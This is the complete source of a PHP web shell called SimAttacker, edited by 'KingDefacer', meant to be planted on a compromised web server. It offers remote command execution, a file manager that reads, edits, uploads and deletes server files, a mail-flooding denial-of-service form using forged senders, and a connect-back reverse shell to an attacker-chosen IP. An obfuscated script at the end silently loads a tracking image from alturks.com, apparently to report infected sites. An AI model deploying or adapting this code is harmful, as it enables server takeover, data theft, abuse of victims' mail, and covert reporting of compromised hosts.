<?

//download Files  Code

$fdownload=$_GET['fdownload'];

if ($fdownload <> "" ){

// path & file name

$path_parts = pathinfo("$fdownload");

$entrypath=$path_parts["basename"];

$name = "$fdownload";

$fp = fopen($name, 'rb');

header("Content-Disposition: attachment; filename=$entrypath");

header("Content-Length: " . filesize($name));

fpassthru($fp);

exit;

}

?>

	

<html>



<head>

<meta http-equiv="Content-Language" content="en-us">

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>SimAttacker - Version : 1.0.0 - Edited By KingDefacer</title>
<style>

<!--

body         { font-family: Tahoma; font-size: 8pt }

-->

</style>

</head>

<body>

<?

error_reporting(E_ERROR | E_WARNING | E_PARSE);



 //File Edit

 $fedit=$_GET['fedit'];

 if ($fedit <> "" ){

 $fedit=realpath($fedit);

 $lines = file($fedit);

 echo "<form action='' method='POST'>";

echo "<textarea name='savefile' rows=30 cols=80>" ;

foreach ($lines as $line_num => $line) {

 echo htmlspecialchars($line);

}

echo "</textarea>

	<input type='text' name='filepath'  size='60' value='$fedit'>

	<input type='submit' value='save'></form>";

	$savefile=$_POST['savefile'];

	$filepath=realpath($_POST['filepath']);

	if ($savefile <> "") 

	{

	$fp=fopen("$filepath","w+");

	fwrite ($fp,"") ;

	fwrite ($fp,$savefile) ;

	fclose($fp);

	echo "<script language='javascript'> close()</script>";

	}

exit();

 }

?>

<?

// CHmod - PRimission

$fchmod=$_GET['fchmod'];

if ($fchmod <> "" ){

$fchmod=realpath($fchmod);

echo "<center><br>

chmod for :$fchmod<br>

<form method='POST' action=''><br>

Chmod :<br>

<input type='text' name='chmod0' ><br>

<input type='submit' value='change chmod'>

</form>";

$chmod0=$_POST['chmod0'];

if ($chmod0 <> ""){

chmod ($fchmod , $chmod0);

}else {

echo "primission Not Allow change Chmod";

}

exit();

}

?>

	

<div align="center">

	<table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99" cellspacing="0" cellpadding="0" height="502">

		<tr>

			<td style="border: 1px dotted #FFCC66" valign="top" rowspan="2">

				<p align="center"><b>

				<font face="Tahoma" size="2"><br>

				</font>

				<font color="#D2D200" face="Tahoma" size="2">

				<span style="text-decoration: none">

				<font color="#000000">

				<a href="?id=fm&dir=<?

	echo getcwd();

	?>

	">

				<span style="text-decoration: none"><font color="#000000">File Manager</font></span></a></font></span></font></b></p>

				<p align="center"><b><a href="?id=cmd">

				<span style="text-decoration: none">

				<font face="Tahoma" size="2" color="#000000">

				CMD</font></span></a><font face="Tahoma" size="2"> Shell</font></b></p>

				<p align="center"><b><a href="?id=fake-mail">

				<font face="Tahoma" size="2" color="#000000">

				<span style="text-decoration: none">Fake mail</span></font></a></b></p>

				<p align="center"><b>

				<font face="Tahoma" size="2" color="#000000">

				<a href="?id=cshell">

				<span style="text-decoration: none"><font color="#000000">Connect Back</font></span></a></font></b></p>

				<p align="center"><b>

				<font color="#000000" face="Tahoma" size="2">

				<a href="?id=">

				<span style="text-decoration: none"><font color="#000000">About</font></span></a></font></b></p>

				<p>&nbsp;<p align="center">&nbsp;</td>

			<td height="422" width="82%" style="border: 1px dotted #FFCC66" align="center">

			<?

			//*******************************************************

			//Start Programs About US

			$id=$_GET['id'];



			if ($id=="") {

			echo "

			<font face='Arial Black' color='#808080' size='1'>

***************************************************************************<br>

&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>

&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>

&nbsp;Note : SimAttacker&nbsp; Have copyright from simorgh security Group  <br>

&nbsp;please : If you find bug or problems in program , tell me by : <br>

&nbsp;e-mail : kingdefacer@msn.com<br>

Red Eye :) [Only 4 Best Friends ] <br>

***************************************************************************</font></span></p>

";



echo "<font color='#333333' size='2'>OS :". php_uname();

echo "<br>IP :". 

($_SERVER['REMOTE_ADDR']);

echo "</font>";





			}

			//************************************************************

			//cmd-command line

			$cmd=$_POST['cmd'];

			if($id=="cmd"){

		$result=shell_exec("$cmd");

		echo "<br><center><h3> CMD ExeCute </h3></center>" ;

		echo "<center>

		<textarea rows=20 cols=70 >$result</textarea><br>

		<form method='POST' action=''>

		<input type='hidden' name='id' value='cmd'>

		<input type='text' size='80' name='cmd' value='$cmd'>

		<input type='submit' value='cmd'><br>";

			

			

			

			}

			

		//********************************************************	

		

		//fake mail = Use victim server 4 DOS - fake mail 

		if ( $id=="fake-mail"){

		error_reporting(0);

		echo "<br><center><h3> Fake Mail- DOS E-mail By Victim Server </h3></center>" ;

		echo "<center><form method='post' action=''>

		Victim Mail :<br><input type='text' name='to' ><br>

		Number-Mail :<br><input type='text' size='5' name='nom' value='100'><br>

		Comments:

		<br>

		<textarea rows='10' cols=50 name='Comments' ></textarea><br>

		<input type='submit' value='Send Mail Strm ' >

		</form></center>";

		//send Storm Mail

		$to=$_POST['to'];

		$nom=$_POST['nom'];

		$Comments=$_POST['Comments'];

		if ($to <> "" ){

		for ($i = 0; $i < $nom ; $i++){

		$from = rand (71,1020000000)."@"."Attacker.com";

		$subject= md5("$from");

        mail($to,$subject,$Comments,"From:$from");

        echo "$i is ok";

        }      

        echo "<script language='javascript'> alert('Sending Mail - please waite ...')</script>";

        }

		}

		//********************************************************



			//Connect Back -Firewall Bypass

			if ($id=="cshell"){

			echo "<br>Connect back Shell , bypass Firewalls<br>

			For user :<br>

			nc -l -p 1019 <br>

			<hr>

			<form method='POST' action=''><br>

			Your IP & BindPort:<br>

			<input type='text' name='mip' >

			<input type='text' name='bport' size='5' value='1019'><br>

			<input type='submit' value='Connect Back'>

			</form>";

		 $mip=$_POST['mip'];

		 $bport=$_POST['bport'];

		 if ($mip <> "")

		 {

		 $fp=fsockopen($mip , $bport , $errno, $errstr);

		 if (!$fp){

		       $result = "Error: could not open socket connection";

		 }

		 else {

		 fputs ($fp ,"\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n"); 

	  while(!feof($fp)){ 

       fputs ($fp," bash # ");

       $result= fgets ($fp, 4096);

      $message=`$result`;

       fputs ($fp,"--> ".$message."\n");

      }

      fclose ($fp);

		 }

		 }

			}

			

		//********************************************************

			//Spy File Manager

			$homedir=getcwd();

			$dir=realpath($_GET['dir'])."/";

			if ($id=="fm"){

			echo "<br><b><p align='left'>&nbsp;Home:</b> $homedir 

                  &nbsp;<b>

                  <form action='' method='GET'>

                  &nbsp;Path:</b>

                  <input type='hidden' name='id' value='fm'>

                  <input type='text' name='dir' size='80' value='$dir'>

                  <input type='submit' value='dir'>

                  </form>

                 <br>";



			echo "



<div align='center'>



<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>

	<tr>

		<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>

		<td height='28' width='82' align='center'>

		<font color='#000080' size='2'><b>Size KByte</b></font></td>

		<td height='28' width='83' align='center'>

		<font color='#008000' size='2'><b>Download</b></font></td>

		<td height='28' width='66' align='center'>

		<font color='#FF9933' size='2'><b>Edit</b></font></td>

		<td height='28' width='75' align='center'>

		<font color='#999999' size='2'><b>Chmod</b></font></td>

		<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>

	</tr>";

		    if (is_dir($dir)){

		    if ($dh=opendir($dir)){

		    while (($file = readdir($dh)) !== false) {

		    $fsize=round(filesize($dir . $file)/1024);

		

		    

	echo " 

	<tr>

		<th width='250' height='22' align='left' nowrap>";

		if (is_dir($dir.$file))

		{

		echo "<a href='?id=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#666666'>&nbsp;$file <font color='#FF0000' size='1'>dir</font>";

		}

		else {

		echo "<font size='2' color='#666666'>&nbsp;$file ";

		}

		echo "</a></font></th>

		<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";

		if (is_file($dir.$file))

		{

		echo "$fsize";

		}

		else {

		echo "&nbsp; ";

		}

		echo "

		</b></font></td>

		<td width='103' align='center' nowrap>";

		if (is_file($dir.$file)){

		if (is_readable($dir.$file)){

		echo "<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download";

		}else {

		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";

		 }

		}else {

		echo "&nbsp;";

		 }

		echo "

		</a></font></td>

		<td width='77' align='center' nowrap>";

		if (is_file($dir.$file))

		{

		if (is_readable($dir.$file)){

		echo "<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";

		}else {

		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";

		 }

		}else {

		echo "&nbsp;";

		 }

		echo "

		</a></font></td>

		<td width='86' align='center' nowrap>";

		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {

		echo "<font size='1' color='#999999'>Dont in windows";

		}

		else {

		echo "<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";

		}

		echo "</a></font></td>

		<td width='86'align='center' nowrap><a href='?id=fm&fdelete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>Delete</a></font></td>

	</tr>

	";

		      }

		      closedir($dh);

		    } 

		    }

		    echo "</table>

<form enctype='multipart/form-data' action='' method='POST'>

 <input type='hidden' name='MAX_FILE_SIZE' value='300000' />

 Send this file: <input name='userfile' type='file' />

 <inpt type='hidden' name='Fupath'  value='$dir'>

 <input type='submit' value='Send File' />

</form> 

		    </div>";

			}

//Upload Files 

$rpath=$_GET['dir'];

if ($rpath <> "") {

$uploadfile = $rpath."/" . $_FILES['userfile']['name'];

print "<pre>";

if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {

echo "<script language='javascript'> alert('\:D Successfully uploaded.!')</script>";

echo "<script language='javascript'> history.back(2)</script>";

}

 }

 //file deleted

$frpath=$_GET['fdelete'];

if ($frpath <> "") {

if (is_dir($frpath)){

$matches = glob($frpath . '/*.*');

if ( is_array ( $matches ) ) {

  foreach ( $matches as $filename) {

  unlink ($filename);

  rmdir("$frpath");

echo "<script language='javascript'> alert('Success! Please refresh')</script>";

echo "<script language='javascript'> history.back(1)</script>";

  }

  }

  }

  else{

echo "<script language='javascript'> alert('Success! Please refresh')</script>";

unlink ("$frpath");

echo "<script language='javascript'> history.back(1)</script>";

exit(0);



  }

  



}

			?>

			

			</td>

		</tr>

		<tr>

			<td style="border: 1px dotted #FFCC66">

			<p align="center"><font color="#666666" size="1" face="Tahoma"><br>

			Copyright 2004-Simorgh Security<br>

			Edited By KingDefacer<br>

			</font><font color="#c0c0c0" size="1" face="Tahoma">

		<a style="TEXT-DECORATION: none" href="http://">

		<font color="#666666"></font></a></font></td>

		</tr>

	</table>

</div>



</body>



</html>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>